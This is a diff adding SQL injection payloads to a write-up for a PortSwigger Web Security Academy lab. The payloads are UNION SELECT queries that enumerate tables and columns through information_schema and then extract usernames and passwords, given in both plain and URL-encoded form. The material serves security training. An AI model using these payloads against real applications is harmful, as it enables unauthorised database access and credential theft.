@@ -20,8 +20,17 @@ To solve the lab, log in as the administrator user.
 > Scripting the attack: [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/SQL-Injection/lab-09/sqli-lab-09.py)
 
 ## Payload
+To get Table names: ```'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--```
 
+> Table name: `users_bujgao`
 
+To get column names: ```%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_bujgao%27--```
+
+> Column name: `username_yozuai` & `password_coavwc`
+
+Final Normal Payload: `' UNION SELECT username_yozuai, password_coavwc FROM users_bujgao--`
+
+Final URL-Encoded Payload: `%27%20UNION%20SELECT%20username_yozuai,%20password_coavwc%20FROM%20users_bujgao--`
 
 ## Video Solution
 1. Manual: [Rana Khalil's Youtube Video](https://youtu.be/JduM_dO8glw)
